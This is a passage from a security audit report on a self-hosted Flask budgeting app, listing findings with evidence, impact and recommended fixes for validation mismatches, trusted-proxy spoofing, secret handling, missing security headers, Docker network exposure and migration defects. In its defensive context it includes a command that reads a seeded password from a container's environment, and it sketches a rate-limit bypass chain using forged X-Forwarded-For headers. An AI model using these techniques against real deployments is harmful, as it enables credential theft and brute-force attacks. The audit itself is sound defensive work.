  `version_id`-on-mutable-models pattern from C-17 (F-009) is generalised
  across every PATCH endpoint. Edit forms submit the read-time
  `version_id`, schemas require it (e.g. `app/schemas/validation.py:128`),
  and routes raise/return 409 on stale-form submission (see e.g.
  `app/routes/transactions.py:380` "Stale-form conflict on
  update_transaction" and the matching paths in transfer/account/entry
  PATCH routes). The shadow-aware branches are routed through the
  transfer service so shadows inherit the parent's version check.

### F-011: Salary raise percentage -- schema/DB mismatch permits invalid input

- **Severity:** High
- **OWASP:** A03:2021 Injection / Input Validation
- **CWE:** CWE-20 (Improper Input Validation)
- **ASVS:** V5.1.3
- **Source:** S5 (`reports/16-business-logic.md` H-V3), S6
  (`reports/17-migrations-schema.md` F-S6-C4-03)
- **Location:** `app/schemas/validation.py:249-256`,
  `app/models/salary_raise.py:25-26`, `app/routes/salary.py:384,
  :390`
- **Description:** `RaiseCreateSchema.percentage` validates
  `Range(min=-100, max=1000)`, permitting negative values (pay cut) and
  zero. The database CHECK constraint on
  `salary.salary_raises.percentage` is `> 0`, rejecting both. User
  submits a -5% "pay cut" raise; Marshmallow accepts; DB rejects with
  IntegrityError; route catches `Exception` (F-146) and flashes "Failed
  to add raise. Please try again." Same pattern on `flat_amount`.
- **Evidence:**
  ```python
  # app/schemas/validation.py:249-256 (abridged)
  percentage = fields.Decimal(..., validate=validate.Range(min=-100, max=1000))
  flat_amount = fields.Decimal(..., validate=validate.Range(min=-10_000_000, max=10_000_000))
  ```
  ```python
  # app/models/salary_raise.py:25-26
  db.CheckConstraint("percentage > 0", name="ck_salary_raises_positive_percentage")
  db.CheckConstraint("flat_amount > 0", name="ck_salary_raises_positive_flat_amount")
  ```
- **Impact:** User receives an opaque "Failed" error for a valid-looking
  input. No user-facing explanation that negative raises are not
  supported. Two distinct bugs masked: (a) if negative raises are
  intended to model pay cuts, the DB is wrong; (b) if pay cuts are not
  supported, the schema is too permissive. Ambiguity between the two
  layers means user-facing error messaging cannot be correct.
- **Recommendation:** Decide policy: (a) if pay cuts are supported, relax
  DB to `CHECK (percentage <> 0)` (never zero) and allow negatives in a
  migration; (b) if pay cuts are not supported, tighten
  Marshmallow to `Range(min=0, min_inclusive=False, max=1000)`. Either
  way, schema and DB must agree. Recommend (b) until pay-cut modeling
  is an explicit feature request. Three-line schema change; no
  migration needed.
- **Status:** Fixed in C-24 (42720ca, 2026-05-07).
  `app/schemas/validation.py` `RaiseCreateSchema` tightens
  `percentage` to `Range(0.01, 200)` and `flat_amount` to
  `Range(0.01, 10_000_000)`; both reject zero/negative per the "no
  pay cuts" policy and align with the DB CHECK at
  `app/models/salary_raise.py:25-26`.

### F-012: PaycheckDeduction amount -- schema has no Range validation

- **Severity:** High
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S5 (`reports/16-business-logic.md` H-V4), S6
  (`reports/17-migrations-schema.md` F-S6-C4-04)
- **Location:** `app/schemas/validation.py:280`,
  `app/models/paycheck_deduction.py:16`,
  `app/routes/salary.py:515` (add_deduction)
- **Description:** `DeductionCreateSchema.amount = fields.Decimal(
  required=True, places=4, as_string=True)` has no `validate=Range(...)`
  clause. The database CHECK constraint is `amount > 0`. Any value --
  negative, zero, 1e100 -- passes schema validation and hits the DB as
  an IntegrityError.
- **Evidence:**
  ```python
  # app/schemas/validation.py:280 (abridged)
  amount = fields.Decimal(required=True, places=4, as_string=True)
  # No validate=validate.Range(...)
  ```
- **Impact:** User enters `-500` (typo, or thinking it means refund) or
  `0` (thinking "no deduction this period"); both pass schema; DB
  rejects; generic `except Exception` handler flashes "Failed to add
  deduction." User cannot distinguish "amount must be positive" from
  any other kind of failure.
- **Recommendation:** Add `validate=validate.Range(
  min=Decimal("0.0001"), max=Decimal("1000000"))` to
  `DeductionCreateSchema.amount` and the corresponding update schema.
  No migration needed; three-line schema change per route.
- **Status:** Fixed in C-24 (42720ca, 2026-05-07).
  `app/schemas/validation.py` `DeductionCreateSchema.amount` adds
  `validate=Range(0.0001, 1_000_000)`; a cross-field validator caps
  percent inputs at 100 when `calc_method = PERCENTAGE`; companion
  bounds were added to `annual_cap` and `inflation_rate`.

### F-013: user_settings.trend_alert_threshold -- mutually incompatible bounds

- **Severity:** High
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S6 (`reports/17-migrations-schema.md` F-S6-C4-02)
- **Location:** Marshmallow `UserSettingsSchema` (search
  `app/schemas/validation.py` for `trend_alert_threshold`); live DB
  CHECK on `auth.user_settings.trend_alert_threshold`
- **Description:** Marshmallow validates
  `Range(min=1, max=100)` (treating the value as percentage 1-100).
  The DB CHECK is `trend_alert_threshold >= 0 AND
  trend_alert_threshold <= 1` (treating the value as decimal 0-1). No
  value satisfies both: the `server_default='0.1000'` passes DB but
  fails Marshmallow's `min=1`; a user-entered `5` passes Marshmallow
  but fails DB. The field is effectively unwritable via any
  schema-validated route.
- **Evidence:** Live DB `\d+ auth.user_settings` shows
  `CHECK (trend_alert_threshold >= 0::numeric AND
  trend_alert_threshold <= 1::numeric)`. Marshmallow shows
  `Range(min=1, max=100)`. These bounds do not overlap.
- **Impact:** The trend-alert feature is silently broken for any user
  attempting to configure a threshold via the UI. The default
  (`0.1000` = 10%) is loaded at DB creation time and never updated
  because the schema rejects every valid entry.
- **Recommendation:** Choose one convention (recommend decimal 0-1 to
  match the DB and match the storage type). Change Marshmallow to
  `Range(min=Decimal("0"), max=Decimal("1"))`. Update any UI that
  displayed a "1-100" hint. One-line schema change plus template copy
  edit.
- **Status:** Open

### F-014: Percentage-vs-decimal semantic mismatch on rate fields

- **Severity:** High
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-1025 (Comparison Using Wrong Factors)
- **ASVS:** V5.1.3
- **Source:** S6 (`reports/17-migrations-schema.md` F-S6-C4-01)
- **Location:** `auth.user_settings.default_inflation_rate`,
  `salary.fica_configs.{ss_rate,medicare_rate,medicare_surtax_rate}`,
  `salary.state_tax_configs.flat_rate`; corresponding Marshmallow
  schemas in `app/schemas/validation.py`
- **Description:** Marshmallow declares `Range(min=0, max=100)` on
  these rate fields, treating the input as a percentage (0-100). The
  DB CHECK constraints enforce `0-1` (treating as decimal). The model
  storage is `Numeric(5,4)` (4-decimal precision, e.g. `0.0620` for
  the 6.2% SSA rate). User enters `6.2` for the Social Security rate;
  Marshmallow accepts (6.2 ≤ 100); DB rejects (6.2 > 1).
- **Evidence:** Schema `Range(min=0, max=100)` vs. DB
  `CHECK (ss_rate >= 0 AND ss_rate <= 1)` on `salary.fica_configs`.
- **Impact:** Admin-facing tax-config updates produce opaque "Failed"
  messages for valid-looking percentage inputs. The only values that
  round-trip are already-correct 0-1 decimal values, which is the
  opposite of what the UI presents.
- **Recommendation:** Change Marshmallow Range to `min=0, max=1` on
  all listed fields to match DB. Update UI hints and placeholder text
  so users enter `0.062` not `6.2`. Consider a `@pre_load` that
  divides by 100 if a percentage was submitted, but then both layers
  must be consistent.
- **Status:** Open

### F-015: Nginx + Gunicorn trust all RFC 1918 private ranges for proxy headers

- **Severity:** High
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-290 (Authentication Bypass by Spoofing), CWE-348 (Use
  of Less Trusted Source)
- **ASVS:** V14.4.1
- **Source:** S1 Subagent C (`reports/03-config-deploy.md` F-C-01), S1
  Section 1C (`reports/07-manual-deep-dives.md` check 1C.5
  quantification)
- **Location:** `nginx/nginx.conf:117-120`,
  `gunicorn.conf.py:80-83`
- **Description:** Nginx `set_real_ip_from` accepts `127.0.0.1`,
  `172.16.0.0/12`, `192.168.0.0/16`, and `10.0.0.0/8`. Gunicorn's
  `forwarded_allow_ips` default has the same three RFC 1918 subnets.
  Any host or container with any private-range IP that can reach
  Nginx:80 or Gunicorn:8000 can forge `CF-Connecting-IP` or
  `X-Forwarded-For` and Gunicorn records the forged IP as
  `request.remote_addr`. Flask-Limiter keys on
  `get_remote_address`, so the per-IP rate limit becomes
  attacker-controlled. Audit log `remote_addr` fields become useless.
- **Evidence:**
  ```nginx
  # nginx/nginx.conf:117-120
  set_real_ip_from 127.0.0.1;
  set_real_ip_from 172.16.0.0/12;
  set_real_ip_from 192.168.0.0/16;
  set_real_ip_from 10.0.0.0/8;
  ```
  ```python
  # gunicorn.conf.py:80-83
  forwarded_allow_ips = os.getenv(
      "FORWARDED_ALLOW_IPS",
      "172.16.0.0/12,192.168.0.0/16,10.0.0.0/8",
  )
  ```
  Runtime evidence: the app container is on `homelab`
  (172.18.0.0/16), shared with jellyfin/immich/unifi (`scans/
  docker-networks-detail.json`).
- **Impact:** Any compromised co-tenant container on the homelab
  network (jellyfin, immich, unifi, or any future addition) can
  rotate `X-Forwarded-For` per request and each request hits a fresh
  Flask-Limiter counter bucket. Per-IP rate limiting on `/login`,
  `/register`, `/mfa/verify` is defeated. Combined with F-034
  (memory://  backend with per-worker counters), the practical
  brute-force ceiling is effectively unbounded under the co-tenant
  threat model.
- **Recommendation:** Lock `set_real_ip_from` in `nginx.conf` to the
  specific docker bridge subnet(s) the compose project actually uses
  (inspect `shekel-prod_backend` once, hardcode the CIDR). Lock
  `forwarded_allow_ips` in `gunicorn.conf.py` to the exact container
  IP of the nginx service (Gunicorn accepts a single IP). Remove the
  loose `10.0.0.0/8` and `192.168.0.0/16` trust. Delete the fallback
  default in the `os.getenv` call so a misconfigured deploy fails
  closed. See also F-020 (homelab network isolation) for the
  architectural fix.
- **Status:** Open

### F-016: SECRET_KEY has a fallback default in BaseConfig

- **Severity:** High
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-798 (Use of Hard-coded Credentials), CWE-1188
- **ASVS:** V6.4.2, V14.1.1
- **Source:** S1 Subagent C (`reports/03-config-deploy.md` F-C-15)
- **Location:** `app/config.py:22`
- **Description:** `SECRET_KEY = os.getenv("SECRET_KEY",
  "dev-only-change-me-in-production")`. Any Dev or Test run without
  `SECRET_KEY` in the environment silently loads the public default.
  `ProdConfig.__init__` at `config.py:130-135` rejects the specific
  string `"dev-only..."`, but the rejection is narrow: the string
  `"change-me-to-a-random-secret-key"` from `.env.example:11` passes
  the `startswith("dev-only")` guard (F-112), so copying
  `.env.example` to `.env` without editing yields a running production
  instance under a publicly-known SECRET_KEY.
- **Evidence:**
  ```python
  # app/config.py:22
  SECRET_KEY = os.getenv("SECRET_KEY", "dev-only-change-me-in-production")
  ```
  `.env.example:11` literally contains `SECRET_KEY=
  change-me-to-a-random-secret-key`. `ProdConfig.__init__` check at
  `:132` only rejects `startswith("dev-only")`.
- **Impact:** Session cookies, CSRF tokens, and any `itsdangerous`
  token become forgeable against any instance that booted with an
  unedited `.env.example`. The failure mode is silent: the app starts
  normally and auth flows appear functional.
- **Recommendation:** Remove the default entirely in `BaseConfig`:
  `SECRET_KEY = os.getenv("SECRET_KEY")`. Let the app fail to start
  if the var is missing. Match the pattern `TOTP_ENCRYPTION_KEY`
  already uses (`config.py:25`, no default). Update `.env.example`
  comment to direct the operator to generate a key before first run.
  See also F-112 for the placeholder-rejection widening.
- **Status:** Fixed in C-01 (66082c4, 2026-05-01).
  `app/config.py:44` reduces to `SECRET_KEY = os.getenv("SECRET_KEY")`
  with no fallback. ProdConfig at `app/config.py:411-428` then
  rejects empty / placeholder / short values via three distinct
  branches keyed on `_KNOWN_DEFAULT_SECRETS` and
  `_MIN_SECRET_KEY_LENGTH = 32`. `entrypoint.sh:38-55` adds an
  upstream check so misconfiguration is caught before Gunicorn
  starts. `.env.example:15` is empty with generation instructions.

### F-017: REMEMBER_COOKIE_SECURE / REMEMBER_COOKIE_SAMESITE not set in ProdConfig

- **Severity:** High
- **OWASP:** A02:2021 Cryptographic Failures, A05:2021 Security
  Misconfiguration
- **CWE:** CWE-614 (Sensitive Cookie Without Secure Attribute)
- **ASVS:** V3.4.1, V3.4.2
- **Source:** S1 Subagent C (`reports/03-config-deploy.md` F-C-06)
- **Location:** `app/config.py:92-129` (ProdConfig cookie block)
- **Description:** `ProdConfig` hardens the session cookie with
  `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_HTTPONLY=True`,
  `SESSION_COOKIE_SAMESITE="Lax"`, but sets no `REMEMBER_COOKIE_*`.
  Flask-Login defaults are `REMEMBER_COOKIE_SECURE=False` and
  `REMEMBER_COOKIE_SAMESITE=None`. Because no code path forces
  `login_user(remember=False)`, the remember cookie is a 30-day
  authentication credential that is sent on plain HTTP requests and
  attached to cross-site requests.
- **Evidence:**
  ```python
  # app/config.py:126-128 -- session cookie hardened
  SESSION_COOKIE_SECURE = True
  SESSION_COOKIE_HTTPONLY = True
  SESSION_COOKIE_SAMESITE = "Lax"
  # No REMEMBER_COOKIE_* lines anywhere.
  ```
- **Impact:** If a user's browser ever hits an `http://` Shekel URL
  (no HSTS, see F-018), the 30-day remember-me cookie leaks in
  cleartext. The `SameSite=None` default allows cross-site requests
  to revive an authenticated session in a login-CSRF chain. The
  session cookie is hardened; the longer-lived auth credential is
  not.
- **Recommendation:** Add to `ProdConfig`:
  ```python
  REMEMBER_COOKIE_SECURE = True
  REMEMBER_COOKIE_HTTPONLY = True
  REMEMBER_COOKIE_SAMESITE = "Lax"
  ```
  Add a `tests/test_config.py` assertion that all six cookie flags
  are set in ProdConfig.
- **Status:** Fixed in C-02 (83af237, 2026-05-02).
  `app/config.py:382-384` sets `REMEMBER_COOKIE_SECURE`,
  `REMEMBER_COOKIE_HTTPONLY`, and `REMEMBER_COOKIE_SAMESITE = "Lax"`
  in ProdConfig. Companion `tests/test_config.py` assertions cover
  all six cookie flags.

### F-018: HSTS header missing from Flask and Nginx

- **Severity:** High
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
- **ASVS:** V14.4.5
- **Source:** Preliminary Finding #3 (workflow); S1 Subagent C
  (`reports/03-config-deploy.md` F-C-02, Medium); S7
  (`reports/18-asvs-l2.md` V14.4.5, High for a money app). S7's
  higher rating takes precedence.
- **Location:** Absent from `app/__init__.py:412-428`
  (`_register_security_headers`). Absent from `nginx/nginx.conf`
  (grep for `Strict-Transport-Security` returns zero matches).
- **Description:** The Flask after-request hook sets
  `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`,
  `Permissions-Policy`, and `Content-Security-Policy`, but not
  `Strict-Transport-Security`. Nginx's two `add_header` directives
  are scoped to `/static/` and do not include HSTS either. A user who
  types `budget.example.com` (no `https://`) gets an HTTP request
  first, is upgraded to TLS by Cloudflare, and the browser has no
  long-lived instruction to insist on HTTPS next time.
- **Evidence:** Grep of `app/`, `nginx/`, and `gunicorn.conf.py` for
  `Strict-Transport-Security` / `HSTS` returns zero code matches.
- **Impact:** A network-position attacker on cafe WiFi, a hostile
  captive portal, or a DNS hijacker can downgrade the first
  unprotected request per session and strip the session cookie before
  Cloudflare Tunnel terminates TLS. For a solo-owner app this is
  rare; for public release this is the baseline hardening gap.
- **Recommendation:** In `_register_security_headers` at
  `app/__init__.py:412-428`, add:
  ```python
  response.headers["Strict-Transport-Security"] = (
      "max-age=31536000; includeSubDomains"
  )
  ```
  Start with one-year max-age and `includeSubDomains`. Do NOT add
  `preload` until the developer has decided to commit to the HSTS
  preload list (one-way, affects every subdomain forever). Verify
  Cloudflare Edge Certificates dashboard is not already injecting
  HSTS (if it is, this finding downgrades to Info with evidence
  attached).
- **Status:** Fixed in C-02 (83af237, 2026-05-02).
  `app/__init__.py:813` sets `Strict-Transport-Security: max-age=31536000;
  includeSubDomains` (no `preload`, deferred per the runbook). The
  `preload` decision is documented in `docs/runbook_secrets.md` as a
  separately-toggled operator step.

### F-019: Cache-Control: no-store missing on financial pages

- **Severity:** High
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-524 (Use of Cache Containing Sensitive Information)
- **ASVS:** V8.2.1, V8.2.3
- **Source:** S7 (`reports/18-asvs-l2.md` V8.2.1). NEW finding not
  surfaced by S1's security-header review; S1 only audited the Flask
  headers that were present, not the ones that were missing.
- **Location:** `app/__init__.py:409-428` (Flask after-request
  header hook)
- **Description:** `_register_security_headers` emits CSP,
  X-Content-Type-Options, X-Frame-Options, Referrer-Policy, and
  Permissions-Policy but does NOT emit `Cache-Control`. Browser
  default caching applies to financial dashboards, transaction
  pages, and account listings. After logout, a user pressing the
  browser Back button sees cached financial pages reconstructed from
  history.
- **Evidence:** `app/__init__.py:412-428` enumerates every response
  header Flask sets; `Cache-Control` is not among them. Nginx sets
  `Cache-Control: public, immutable` only on `/static/`
  (`nginx.conf:154`), which is the opposite of what financial pages
  need.
- **Impact:** Shared-device scenario: user logs out at a coffee shop,
  attacker sits down, presses Back, sees the full financial
  dashboard from browser history cache. The auth session is gone but
  the rendered HTML is still on disk. Same risk on a kiosk, a shared
  home browser profile, or any Do-Not-Disturb / screen-locker
  scenario.
- **Recommendation:** In `_register_security_headers`, add:
  ```python
  response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
  response.headers["Pragma"] = "no-cache"
  ```
  Scope to authenticated routes only if desired (check
  `current_user.is_authenticated`), or apply globally -- the app
  serves no truly-cacheable dynamic HTML. Keep the static-asset
  caching in `nginx.conf:154` as-is.
- **Status:** Fixed in C-02 (83af237, 2026-05-02).
  `app/__init__.py:817-832` sets `Cache-Control: no-store` (and
  legacy `Pragma: no-cache`) on every dynamic response while excluding
  the static endpoint so the nginx vendor caching survives. This
  closes the back-button-leak gap on every authenticated page.

### F-020: Flat shared "homelab" network exposes app to co-tenants

- **Severity:** High
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-653 (Improper Isolation or Compartmentalization)
- **ASVS:** V14.4.1
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-01); S3
  Section 1I (`reports/13-attack-surface.md` Section 3.2)
- **Location:** `/opt/docker/shekel/docker-compose.override.yml:4-6`
  (not in repo, see F-021); `homelab` Docker network (172.18.0.0/16)
- **Description:** Production `shekel-prod-app` sits on the shared
  `homelab` Docker network (172.18.0.0/16) alongside
  `immich_server`, `jellyfin`, `unifi`, `cloudflared`, and `nginx`.
  The network is not `internal: true`. Any co-tenant container on
  homelab can reach `shekel-prod-app:8000` directly, bypassing
  `nginx`, bypassing TLS, bypassing `set_real_ip_from` normalization,
  bypassing rate limiting.
- **Evidence:** `scans/docker-networks-detail.json` shows
  `shekel-prod-app` with two interfaces: one on
  `shekel-prod_backend` (internal) and one on `homelab` (not
  internal). Co-members of homelab from the same file: immich_server,
  jellyfin, unifi, cloudflared, nginx.
- **Impact:** A vulnerability in jellyfin, immich, or unifi (all
  internet-facing media servers with CVE histories) becomes a direct
  attack vector against Shekel's gunicorn on port 8000. The attacker
  lands on homelab and sends authenticated-looking requests to
  gunicorn with forged `X-Forwarded-For` (see F-015) to bypass rate
  limiting. Combined with F-015 and F-034 this is the "one other
  service gets popped -> Shekel follows" chain.
- **Recommendation:** Create a dedicated `shekel-frontend` bridge
  network containing only `nginx` and `shekel-prod-app`. Remove
  `shekel-prod-app` from `homelab`. Nginx proxies to the app via the
  dedicated network; other services cannot reach the app directly.
  Cloudflared joins `shekel-frontend` if the WAN path bypasses nginx
  (see F-063), or keep cloudflared on homelab but terminate through
  nginx.
- **Status:** Open

### F-021: Production nginx + override configs are not version-controlled

- **Severity:** High
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188 (Initialization with Hard-Coded Network Resource
  Configuration)
- **ASVS:** V14.1.2, V14.2.1
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-02 +
  F-D-03); S3 Section 1I (`reports/13-attack-surface.md` Section 6
  findings #3 + #5)
- **Location:** `/opt/docker/nginx/nginx.conf`,
  `/opt/docker/nginx/conf.d/shekel.conf`,
  `/opt/docker/shekel/docker-compose.override.yml`
- **Description:** The repo's `nginx/nginx.conf` is Shekel-specific
  config with Cloudflare real-IP handling, JSON logging, gzip,
  static file serving, and security headers. The running nginx in
  production uses a completely different generic homelab config from
  `/opt/docker/nginx/`, with the Shekel server block in
  `/opt/docker/nginx/conf.d/shekel.conf`. None of the production
  files are in the repo. The `docker-compose.override.yml` on the
  production host disables the bundled nginx (via
  `profiles: ["disabled"]`) and adds the `homelab` network to the
  app (F-020). That file is also not in the repo.
- **Evidence:** File drift table from `reports/08-runtime.md`:

  | Config file | Repo path | Container path | Drift |
  |---|---|---|---|
  | nginx.conf | `nginx/nginx.conf` | via `/opt/docker/nginx/nginx.conf` | TOTAL |
  | shekel vhost | N/A | `/etc/nginx/conf.d/shekel.conf` | prod-only |
  | compose override | N/A | `/opt/docker/shekel/docker-compose.override.yml` | prod-only |
  | gunicorn.conf.py | `gunicorn.conf.py` | `/home/shekel/app/gunicorn.conf.py` | identical |

  Scan files `scans/shared-nginx.conf.txt`,
  `scans/shared-nginx-shekel-vhost.conf.txt`, and
  `scans/prod-compose-override.txt` preserve the current prod
  content.
- **Impact:** Changes to the repo's `nginx/nginx.conf` have no effect
  on production. Disaster recovery, new-host bring-up, or
  code-driven redeploy produces a different running architecture
  than git shows. Security-header changes that pass review on the
  repo's nginx.conf never take effect. Reviewing the repo is not the
  same as reviewing production. Every auditor after today's will
  need the same archaeological pass.
- **Recommendation:** Commit the production files into the repo, in
  a directory that makes the topology self-describing. Suggested:
  - `deploy/nginx-shared/nginx.conf` (replace the repo's current
    `nginx/nginx.conf` OR rename the existing one to
    `deploy/nginx-bundled/nginx.conf` and document that it is
    aspirational).
  - `deploy/nginx-shared/conf.d/shekel.conf`
  - `docker-compose.prod.yml` (rename `docker-compose.override.yml`
    so its role is explicit).
  - Update README to explain which files are active in which
    deployment mode.
- **Status:** Open

### F-022: SEED_USER_PASSWORD persists in running container environment

- **Severity:** High
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-798 (Use of Hard-Coded Credentials)
- **ASVS:** V6.4.1
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-04)
- **Location:** `shekel-prod-app` container environment
  (`scans/container-config.json`); `docker-compose.yml` environment
  block
- **Description:** The seeding password for the initial user is
  passed as `SEED_USER_PASSWORD` via docker-compose and remains in
  the container's `os.environ` for the lifetime of the container.
  Readable by any process inside the container
  (`/proc/1/environ`), by any host user who can run `docker
  inspect` or `docker exec`, and by Docker's JSON log driver if env
  vars are ever logged.
- **Evidence:** `docker exec shekel-prod-app env | grep SEED` returned
  `SEED_USER_PASSWORD=<redacted>` in S2 audit runtime.
- **Impact:** If the production user's password has not been rotated
  since seeding (S2 flagged but could not verify), the live
  credential is exposed to any container-escape, any co-tenant
  compromise that reads `/var/lib/docker`, and any `docker inspect`.
  Even if rotated, the seed value is still live in `os.environ`
  until the next container recreate.
- **Recommendation:** (1) Rotate the production user's password if
  it matches the seed value. (2) Remove `SEED_USER_PASSWORD` (and
  `SEED_USER_EMAIL`) from the runtime environment after initial
  setup -- the seed script only needs these at one-shot invocation
  time. Move them to a file-based env file read only by the
  seeding script, or pass them on the `docker run` command that
  invokes the seed script and not on the long-running app service.
  (3) Consider Docker secrets for credentials that must persist.
- **Status:** Open

### F-023: Host .env files are world-readable (mode 644)

- **Severity:** High
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-732 (Incorrect Permission Assignment)
- **ASVS:** V6.4.1
- **Source:** S2 Section 1H (`reports/12-host-hardening.md` F-H-01)
- **Location:** `/home/josh/projects/Shekel/.env` (perms 644),
  `/opt/docker/shekel/.env` (perms 644)
- **Description:** Both `.env` files on the production host contain
  live secrets (`SECRET_KEY`, `TOTP_ENCRYPTION_KEY`, `DATABASE_URL`
  with password, `SEED_USER_PASSWORD`). File mode 644 (`rw-r--r--`)
  means any UID on the host can read them. On Arch this is the
  default for a file created by the owner without `umask 077`.
- **Evidence:** `stat` output from Lynis audit; S2 inspected both
  paths directly.
- **Impact:** A compromised non-root process (e.g. any container
  escape that yields a shell in the `docker` group but not root, or
  a second process spawned under a different host user) can read the
  file and extract every secret. All TOTP ciphertexts become
  decryptable; all sessions become forgeable; the database password
  is disclosed.
- **Recommendation:** `chmod 600` on both paths. Verify the
  operator is `josh` (not a service user that would lose access).
  Consider also moving the `/opt/docker/shekel/.env` path to a
  root-owned location and mounting it read-only into the container
  if the app user inside the container does not need to read it
  post-boot.
- **Status:** Open

### F-024: kernel.kptr_restrict = 0 on host

- **Severity:** High
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **ASVS:** V14.2.1
- **Source:** S2 Section 1H (`reports/12-host-hardening.md` F-H-02);
  Lynis KRNL-6000
- **Location:** `/proc/sys/kernel/kptr_restrict` on the Arch host
- **Description:** `kernel.kptr_restrict = 0` allows any process to
  read kernel pointer addresses from `/proc/kallsyms`. This defeats
  KASLR (Kernel Address Space Layout Randomization), which normally
  makes kernel-exploit development more expensive by hiding where
  kernel code is loaded in memory.
- **Evidence:** `sysctl kernel.kptr_restrict` returned `0` during
  the Lynis audit recorded in `scans/lynis.log`.
- **Impact:** A local attacker (container escape, LAN-reachable
  service compromise) has an easier time writing a reliable kernel
  exploit because kernel addresses are not hidden. On a homelab host
  that also runs other services, this raises the blast radius of any
  co-tenant compromise.
- **Recommendation:** Create `/etc/sysctl.d/99-hardening.conf`
  containing `kernel.kptr_restrict = 2`, then `sysctl --system`.
  Value 2 hides pointers from all users including root; value 1
  hides from non-root only. Value 2 is the modern default on most
  distributions.
- **Status:** Open

### F-025: OpenSSL packages in container image have available security updates

- **Severity:** High
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)
- **ASVS:** V14.2.2
- **Source:** S2 Section 1G (`reports/11-container-image.md`
  F-G-01); trivy scan `scans/trivy-image.json`
- **Location:** Docker image `ghcr.io/saltyreformed/shekel:latest`
  (revision `91f2627`), packages `libssl3t64`, `openssl`,
  `openssl-provider-legacy` at version `3.5.5-1~deb13u1`
- **Description:** 5 OpenSSL CVEs (CVE-2026-28390 HIGH, CVE-2026-
  28388 MEDIUM, CVE-2026-28389 MEDIUM, CVE-2026-31789 MEDIUM for
  32-bit only, CVE-2026-31790 MEDIUM) plus 2 LOW CVEs have an
  available fix in Debian package version `3.5.5-1~deb13u2`. The
  image has not been rebuilt since the fix became available.
- **Evidence:** Trivy output excerpt:
  ```
  libssl3t64    3.5.5-1~deb13u1  3.5.5-1~deb13u2  HIGH  CVE-2026-28390
  openssl       3.5.5-1~deb13u1  3.5.5-1~deb13u2  HIGH  CVE-2026-28390
  ```
- **Impact:** The application's code paths likely do not reach the
  CMS (Cryptographic Message Syntax) code targeted by CVE-2026-28390
  -- Fernet uses AES-CBC-HMAC, not CMS -- but OpenSSL is foundational
  and an unpatched version with available fixes is the canonical
  compliance-audit finding.
- **Recommendation:** Add `RUN apt-get update && apt-get
  upgrade -y openssl libssl3t64 openssl-provider-legacy && rm -rf
  /var/lib/apt/lists/*` to the Dockerfile (or upgrade the base
  image's Debian release) and rebuild. Pin the rebuild to a digest
  so the prod pull is deterministic (see F-060). Re-run trivy to
  confirm the HIGH CVE disappears.
- **Status:** Open

### F-026: Migration efffcf647644 adds NOT NULL column without backfill

- **Severity:** High
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1053 (Missing Documentation for Design)
- **ASVS:** V14.1.2
- **Source:** S6 (`reports/17-migrations-schema.md` F-S6-C1-01)
- **Location:** `migrations/versions/efffcf647644_*.py`
  (`add_account_id_column_to_transactions`)
- **Description:** The migration adds
  `budget.transactions.account_id` as `NOT NULL` without a
  `server_default` and without a data-backfill step. On an empty
  table the migration succeeds; on a populated table the migration
  fails immediately with `IntegrityError: null value in column
  "account_id" violates not-null constraint`. Production has already
  applied the migration (evidence: the column exists), so someone
  must have run a manual backfill, but the backfill is not recorded
  in the migration. A fresh-env recovery (disaster recovery,
  staging provisioning) cannot reproduce production's state from
  `flask db upgrade`.
- **Evidence:** Read of the migration file shows no backfill; live
  DB has the column populated.
- **Impact:** The migration chain is not idempotent against a
  non-empty dataset. Disaster recovery from a pre-migration backup
  is broken. Staging rebuild is broken. Any new developer who
  restores a database snapshot and runs migrations hits this
  immediately.
- **Recommendation:** Amend the migration to a three-step pattern:
  (1) add the column as nullable, (2) execute a backfill UPDATE (use
  whatever logic the manual backfill used -- most likely
  `UPDATE budget.transactions t SET account_id = ... FROM ...`),
  (3) `alter_column` to `NOT NULL`. Document the backfill logic in
  a code comment. Test downgrade in both directions against a
  populated test DB.
- **Status:** Open

### F-027: Duplicate CHECK constraint names across migrations #7 and #28

- **Severity:** High
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188
- **ASVS:** V14.1.2
- **Source:** S6 (`reports/17-migrations-schema.md` F-S6-C1-02),
  related to F-S6-C3-02
- **Location:** `migrations/versions/c5d6e7f8a901_*.py` (#7),
  `migrations/versions/dc46e02d15b4_*.py` (#28)
- **Description:** Migration #7 created CHECK constraints
  `ck_transactions_positive_amount` and
  `ck_transactions_positive_actual` on
  `budget.transactions.estimated_amount` and `actual_amount`.
  Migration #28 created effectively identical CHECK constraints
  under different names `ck_transactions_estimated_amount` and
  `ck_transactions_actual_amount`. The model declares the #28 pair
  only. Live DB inspection shows the #7 constraints were
  subsequently manually dropped (or the migration partially failed
  -- see F-069 for the sibling index that also disappeared from the
  same migration). Neither migration cleans up the other; a
  re-run would create both pairs.
- **Evidence:** Grep of migration files for `ck_transactions_*`
  shows four distinct constraint names across two migrations with
  overlapping semantics. Live DB `\d+` output on
  `budget.transactions` shows only the #28 pair.
- **Impact:** Future auto-generated migrations see a stale schema
  (where the #7 constraints do not exist) and may attempt to
  recreate them. Running `flask db downgrade` past #28 removes the
  #28 pair but leaves no enforcement (the #7 pair was already
